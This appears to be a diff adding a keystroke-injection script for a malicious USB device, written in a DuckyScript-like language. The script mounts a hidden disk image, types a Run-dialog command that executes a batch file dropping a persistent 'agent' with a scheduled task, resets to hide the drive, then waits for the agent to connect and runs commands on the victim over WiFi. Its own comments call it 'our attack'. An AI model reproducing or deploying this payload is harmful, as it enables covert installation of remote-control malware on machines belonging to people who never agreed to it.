@@ -1,0 +1,45 @@
+REM To run this, you first need to create a disk image which contains the agent
+REM Follow tools/README.md for instructions
+REM Make sure the disk image is named agent.img you put it on the SD card
+
+DEFINE #FILE /agentInstalled
+
+REM Only install the agent if this is the first machine we've been plugged into
+IF (FILE_EXISTS() == FALSE) THEN
+  USB_MOUNT_DISK_READ_ONLY /agent.img
+
+  WAIT_FOR_USB_STORAGE_ACTIVITY
+
+  REM Searches each drive for a file name in1.bat. Run it if found
+
+  REM Open Run window
+  GUI R
+  DELAY 1000
+
+  REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
+  REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
+  REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
+  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
+  ENTER
+
+  REM The script needs time from Windows to actually start
+  DELAY 1000
+  REM Wait for the files to be copied to the right place and a task created
+  WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
+  DELAY 1000
+
+  REM At this point the agent will copy itself somewhere safe and rerun itself
+  REM we can wait until it connects
+
+  CREATE_FILE()
+
+  REM By resetting we can make the USB drive go away
+  RESET
+END_IF
+
+WHILE (AGENT_CONNECTED() == FALSE)
+  DELAY 2000
+END_WHILE
+
+REM run a command, to see the results check the log over WiFi
+AGENT_RUN dir
